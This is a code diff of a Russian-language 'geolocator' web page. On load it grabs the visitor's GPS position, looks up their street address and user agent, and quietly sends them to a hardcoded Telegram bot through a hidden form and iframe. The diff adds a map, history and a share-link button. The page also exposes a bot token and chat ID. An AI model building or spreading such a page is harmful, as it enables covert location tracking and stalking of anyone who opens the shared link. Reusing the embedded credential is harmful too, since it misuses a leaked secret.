@@ -4,6 +4,8 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>📍 Геолокатор</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
         * {
             margin: 0;
@@ -24,29 +26,31 @@
             background: #161b22;
             border: 1px solid #30363d;
             border-radius: 20px;
-            padding: 30px 24px;
-            max-width: 500px;
+            padding: 24px;
+            max-width: 600px;
             width: 100%;
-            text-align: center;
         }
         .card h1 {
             font-size: 24px;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
+            text-align: center;
         }
         .card h1 span {
             color: #58a6ff;
+        }
+        #map {
+            height: 300px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            border: 1px solid #30363d;
         }
         .status-box {
             background: #0d1117;
             border: 1px solid #30363d;
             border-radius: 12px;
-            padding: 20px 16px;
-            margin-bottom: 24px;
-            min-height: 120px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+            padding: 16px;
+            margin-bottom: 16px;
+            text-align: center;
         }
         .status-box .loader {
             display: inline-block;
@@ -56,15 +60,11 @@
             border-top: 3px solid #58a6ff;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         .status-box .text {
             font-size: 15px;
@@ -77,45 +77,98 @@
             color: #f85149;
         }
         .status-box .coords {
-            font-family: 'Courier New', monospace;
+            font-family: monospace;
             font-size: 18px;
             color: #f0883e;
-            margin-top: 6px;
-            word-break: break-all;
+            margin-top: 4px;
         }
         .status-box .accuracy {
             font-size: 13px;
             color: #8b949e;
-            margin-top: 4px;
         }
-        .btn {
-            background: #238636;
-            color: white;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 10px;
+        .status-box .address {
             font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .btn:hover {
-            background: #2ea043;
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #484f58;
-            border-top: 1px solid #21262d;
-            padding-top: 16px;
+            color: #58a6ff;
+            margin-top: 4px;
         }
         .status-sent {
             color: #58a6ff;
             font-size: 13px;
             margin-top: 4px;
         }
-        iframe {
-            display: none;
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        .btn {
+            padding: 10px 18px;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.2s;
+            color: white;
+            flex: 1;
+            min-width: 100px;
+        }
+        .btn-primary {
+            background: #238636;
+        }
+        .btn-primary:hover {
+            background: #2ea043;
+        }
+        .btn-secondary {
+            background: #1f6feb;
+        }
+        .btn-secondary:hover {
+            background: #388bfd;
+        }
+        .btn-danger {
+            background: #da3633;
+        }
+        .btn-danger:hover {
+            background: #f85149;
+        }
+        .btn-outline {
+            background: #21262d;
+            border: 1px solid #30363d;
+            color: #c9d1d9;
+        }
+        .btn-outline:hover {
+            background: #30363d;
+        }
+        .history {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 12px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-size: 13px;
+            font-family: monospace;
+            color: #8b949e;
+        }
+        .history .entry {
+            padding: 4px 0;
+            border-bottom: 1px solid #161b22;
+        }
+        .history .entry .time {
+            color: #484f58;
+        }
+        .history .entry .c {
+            color: #f0883e;
+        }
+        .footer {
+            margin-top: 16px;
+            font-size: 12px;
+            color: #484f58;
+            text-align: center;
+            border-top: 1px solid #21262d;
+            padding-top: 12px;
         }
     </style>
 </head>
@@ -124,59 +177,102 @@
     <div class="card">
         <h1>📍 <span>Геолокатор</span></h1>
 
+        <div id="map"></div>
+
         <div class="status-box" id="statusBox">
             <div class="loader" id="loader"></div>
             <div class="text" id="statusText">Определение геолокации...</div>
             <div class="coords" id="coordsDisplay">—</div>
             <div class="accuracy" id="accuracyDisplay"></div>
+            <div class="address" id="addressDisplay"></div>
             <div class="status-sent" id="sentStatus"></div>
         </div>
 
-        <button class="btn" id="btnRefresh" onclick="getLocation()">🔄 Обновить</button>
+        <div class="btn-group">
+            <button class="btn btn-primary" id="btnRefresh" onclick="getLocation()">🔄 Обновить</button>
+            <button class="btn btn-secondary" onclick="shareLink()">🔗 Поделиться</button>
+            <button class="btn btn-danger" onclick="clearHistory()">🗑️ Очистить</button>
+        </div>
+
+        <div class="history" id="historyBox">
+            <div style="color:#484f58; text-align:center; padding:8px;">📋 История пуста</div>
+        </div>
 
         <div class="footer">
-            ⚡ Данные отправляются в Telegram
+            ⚡ Данные отправляются в Telegram • <span id="countLabel">0 точек</span>
         </div>
     </div>
 
     <script>
+        // ====== НАСТРОЙКИ ======
         const BOT_TOKEN = "8975499216:AAEmqWVeYW6vm0p5MjI0d_ec-RDzrVLwxM0";
         const CHAT_ID = "2131297532";
 
-        function sendToTelegram(lat, lon, acc) {
+        // ====== КАРТА ======
+        const map = L.map('map').setView([55.7558, 37.6173], 13);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '© OpenStreetMap'
+        }).addTo(map);
+
+        let marker = null;
+        let circle = null;
+
+        function updateMap(lat, lon, acc) {
+            if (marker) map.removeLayer(marker);
+            if (circle) map.removeLayer(circle);
+            marker = L.marker([lat, lon]).addTo(map);
+            circle = L.circle([lat, lon], {
+                radius: acc || 50,
+                color: '#f03',
+                fillColor: '#f03',
+                fillOpacity: 0.15
+            }).addTo(map);
+            map.setView([lat, lon], 16);
+        }
+
+        // ====== ГЕОКОДЕР (адрес по координатам) ======
+        async function getAddress(lat, lon) {
+            try {
+                const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=ru`;
+                const resp = await fetch(url);
+                const data = await resp.json();
+                return data?.display_name || null;
+            } catch {
+                return null;
+            }
+        }
+
+        // ====== ОТПРАВКА В TELEGRAM ======
+        function sendToTelegram(lat, lon, acc, address) {
+            const addressText = address ? `📍 Адрес: ${address}` : '📍 Адрес не определён';
             const text = encodeURIComponent(
-                `📍 Новая геолокация!\n\nШирота: ${lat.toFixed(6)}\nДолгота: ${lon.toFixed(6)}\nТочность: ±${Math.round(acc)} м\n\nУстройство: ${navigator.userAgent}`
+                `📍 Новая геолокация!\n\nШирота: ${lat.toFixed(6)}\nДолгота: ${lon.toFixed(6)}\nТочность: ±${Math.round(acc)} м\n\n${addressText}\n\nУстройство: ${navigator.userAgent}`
             );
 
-            // Создаём форму с GET-методом
             const form = document.createElement('form');
             form.method = 'GET';
             form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             form.target = 'telegramFrame';
 
-            const input1 = document.createElement('input');
-            input1.type = 'hidden';
-            input1.name = 'chat_id';
-            input1.value = CHAT_ID;
+            const i1 = document.createElement('input');
+            i1.type = 'hidden';
+            i1.name = 'chat_id';
+            i1.value = CHAT_ID;
+            const i2 = document.createElement('input');
+            i2.type = 'hidden';
+            i2.name = 'text';
+            i2.value = decodeURIComponent(text);
 
-            const input2 = document.createElement('input');
-            input2.type = 'hidden';
-            input2.name = 'text';
-            input2.value = decodeURIComponent(text);
+            form.appendChild(i1);
+            form.appendChild(i2);
 
-            form.appendChild(input1);
-            form.appendChild(input2);
-
-            // Создаём iframe, куда будет отправлен запрос
             const iframe = document.createElement('iframe');
             iframe.name = 'telegramFrame';
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
-
             document.body.appendChild(form);
             form.submit();
 
-            // Убираем всё через секунду
             setTimeout(() => {
                 document.body.removeChild(form);
                 document.body.removeChild(iframe);
@@ -186,10 +282,14 @@
                 `📤 Отправлено в Telegram (${new Date().toLocaleTimeString()})`;
         }
 
-        function getLocation() {
+        // ====== ОСНОВНАЯ ФУНКЦИЯ ======
+        let history = [];
+
+        async function getLocation() {
             const statusText = document.getElementById('statusText');
             const coordsDisplay = document.getElementById('coordsDisplay');
             const accuracyDisplay = document.getElementById('accuracyDisplay');
+            const addressDisplay = document.getElementById('addressDisplay');
             const sentStatus = document.getElementById('sentStatus');
             const loader = document.getElementById('loader');
             const btn = document.getElementById('btnRefresh');
@@ -198,6 +298,7 @@
             statusText.className = 'text';
             coordsDisplay.textContent = '—';
             accuracyDisplay.textContent = '';
+            addressDisplay.textContent = '';
             sentStatus.textContent = '';
             loader.style.display = 'inline-block';
             btn.disabled = true;
@@ -211,11 +312,12 @@
             }
 
             navigator.geolocation.getCurrentPosition(
-                function(pos) {
+                async function(pos) {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     const acc = pos.coords.accuracy;
 
+                    // Показываем
                     coordsDisplay.textContent = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
                     accuracyDisplay.textContent = `±${Math.round(acc)} м`;
                     statusText.textContent = '✅ Геолокация получена!';
@@ -223,7 +325,32 @@
                     loader.style.display = 'none';
                     btn.disabled = false;
 
-                    sendToTelegram(lat, lon, acc);
+                    // Карта
+                    updateMap(lat, lon, acc);
+
+                    // Адрес
+                    const address = await getAddress(lat, lon);
+                    if (address) {
+                        addressDisplay.textContent = `📍 ${address}`;
+                    } else {
+                        addressDisplay.textContent = '📍 Адрес не определён';
+                    }
+
+                    // История
+                    const entry = {
+                        lat,
+                        lon,
+                        acc,
+                        address,
+                        time: new Date().toLocaleString()
+                    };
+                    history.push(entry);
+                    if (history.length > 20) history.shift();
+                    renderHistory();
+                    document.getElementById('countLabel').textContent = `${history.length} точек`;
+
+                    // Отправка в Telegram
+                    sendToTelegram(lat, lon, acc, address);
                 },
                 function(err) {
                     let msg = '';
@@ -250,9 +377,86 @@
             );
         }
 
+        // ====== ИСТОРИЯ ======
+        function renderHistory() {
+            const box = document.getElementById('historyBox');
+            if (history.length === 0) {
+                box.innerHTML = '<div style="color:#484f58; text-align:center; padding:8px;">📋 История пуста</div>';
+                return;
+            }
+            box.innerHTML = history.map(h =>
+                `<div class="entry">
+                    <span class="time">${h.time}</span>
+                    → <span class="c">${h.lat.toFixed(5)}, ${h.lon.toFixed(5)}</span>
+                    ${h.address ? `📍 ${h.address.slice(0, 60)}` : ''}
+                </div>`
+            ).join('');
+            box.scrollTop = box.scrollHeight;
+        }
+
+        function clearHistory() {
+            if (history.length === 0) return;
+            history = [];
+            renderHistory();
+            document.getElementById('countLabel').textContent = '0 точек';
+            document.getElementById('coordsDisplay').textContent = '—';
+            document.getElementById('accuracyDisplay').textContent = '';
+            document.getElementById('addressDisplay').textContent = '';
+            document.getElementById('sentStatus').textContent = '';
+            if (marker) map.removeLayer(marker);
+            if (circle) map.removeLayer(circle);
+            map.setView([55.7558, 37.6173], 13);
+        }
+
+        // ====== ПОДЕЛИТЬСЯ ======
+        function shareLink() {
+            const url = window.location.href;
+            if (navigator.share) {
+                navigator.share({ title: '📍 Геолокатор', url: url });
+            } else {
+                navigator.clipboard?.writeText(url).then(() => {
+                    alert('🔗 Ссылка скопирована в буфер!');
+                }).catch(() => {
+                    prompt('Скопируйте ссылку вручную:', url);
+                });
+            }
+        }
+
+        // ====== ЗАГРУЗКА ======
         window.onload = function() {
+            // Загружаем историю из кеша
+            try {
+                const saved = sessionStorage.getItem('geo_history');
+                if (saved) {
+                    const parsed = JSON.parse(saved);
+                    if (parsed.length) {
+                        history = parsed;
+                        renderHistory();
+                        document.getElementById('countLabel').textContent = `${history.length} точек`;
+                        const last = history[history.length - 1];
+                        updateMap(last.lat, last.lon, last.acc || 50);
+                        document.getElementById('coordsDisplay').textContent =
+                            `${last.lat.toFixed(6)}, ${last.lon.toFixed(6)}`;
+                        document.getElementById('accuracyDisplay').textContent =
+                            `±${Math.round(last.acc || 0)} м (кеш)`;
+                        if (last.address) {
+                            document.getElementById('addressDisplay').textContent = `📍 ${last.address}`;
+                        }
+                        document.getElementById('statusText').textContent = '📌 Из кеша';
+                        document.getElementById('statusText').className = 'text';
+                    }
+                }
+            } catch (e) {}
+
             setTimeout(getLocation, 500);
         };
+
+        // Сохраняем историю в кеш
+        setInterval(() => {
+            try {
+                sessionStorage.setItem('geo_history', JSON.stringify(history));
+            } catch (e) {}
+        }, 3000);
     </script>
 
 </body>
